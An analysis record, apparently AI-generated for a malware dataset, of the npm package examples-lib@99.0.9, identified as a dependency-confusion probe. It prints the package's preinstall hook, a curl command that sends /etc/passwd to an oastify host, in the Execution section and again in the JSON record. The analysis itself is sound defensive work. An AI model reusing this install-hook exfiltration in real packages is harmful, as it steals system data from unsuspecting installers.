# npm examples-lib@99.0.9

**Source:** datadog · **Source label:** malicious · **Released:** 2025-08-23 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package is just a `package.json` whose `preinstall` hook runs `sh -c` with a single `curl` command. curl POSTs the file name and the full contents of `/etc/passwd` to an oastify (Burp Collaborator) host. There are no gates: no shell conditionals in the hook, no JS code, and no manifest os/cpu/libc fields. Any POSIX install with `sh`, `curl`, `/etc/passwd` and outbound HTTPS triggers the exfil.

## Execution

- **preinstall** `sh -c 'curl -sS -X POST --data-urlencode file=/etc/passwd --data-urlencode content@/etc/passwd hxxps://aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com'`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com:443 (curl POSTs the file contents to this HTTPS endpoint)
- installed_tool: sh, curl (hook runs sh -c with curl)
- file_present: /etc/passwd (curl reads the file with content@/etc/passwd; a missing file makes curl fail)
- os: linux, darwin (needs a POSIX sh and /etc/passwd; on Windows the hook fails)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The tool prefilled `download_then_exec`; I removed it because nothing fetched is executed.
- The description calls itself a dependency-confusion security research PoC and includes a contact address (not recorded). That is text only. The code still exfiltrates `/etc/passwd`, so the assessment stays malicious.
- Version 99.0.9 is the usual high-version trick for dependency confusion.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "examples-lib",
    "version": "99.0.9",
    "archive_sha256": "156b9efdf3c5ad8496b6ef3c2e829315116f96b5ee03701f23d98d0f59bc4e66",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-08-23",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-08-23-examples-lib-v99.0.9.zip",
    "package_root": "layer0/tmp/tmpuhbj123_/examples-lib/package",
    "cluster_key": "39f17162dbc12a81f54d0b5f61c79fa375c68423bf1fe10e6329b06ac0e348e0",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "sh -c 'curl -sS -X POST --data-urlencode file=/etc/passwd --data-urlencode content@/etc/passwd hxxps://aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com'",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "package.json: the only file; the preinstall hook string read in full. No JS files, no conditionals in the hook command, nothing unread.",
      "Prefilled launch style download_then_exec removed: curl only POSTs /etc/passwd and its response is printed, nothing fetched is run.",
      "Manifest has no os/cpu/libc fields, so there is no manifest gate. The description calls it a security research PoC; that is text only and does not change the labels."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com:443",
      "reason": "curl POSTs the file contents to this HTTPS endpoint"
    },
    {
      "axis": "installed_tool",
      "value": [
        "sh",
        "curl"
      ],
      "reason": "hook runs sh -c with curl"
    },
    {
      "axis": "file_present",
      "value": "/etc/passwd",
      "reason": "curl reads the file with content@/etc/passwd; a missing file makes curl fail"
    },
    {
      "axis": "os",
      "value": [
        "linux",
        "darwin"
      ],
      "reason": "needs a POSIX sh and /etc/passwd; on Windows the hook fails"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "oastify /etc/passwd dependency-confusion probe",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally sends the contents of /etc/passwd to an OAST (Burp Collaborator) host via curl. Version 99.0.9 and a generic name fit a dependency-confusion probe; whatever the stated intent, it exfiltrates host data at install.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
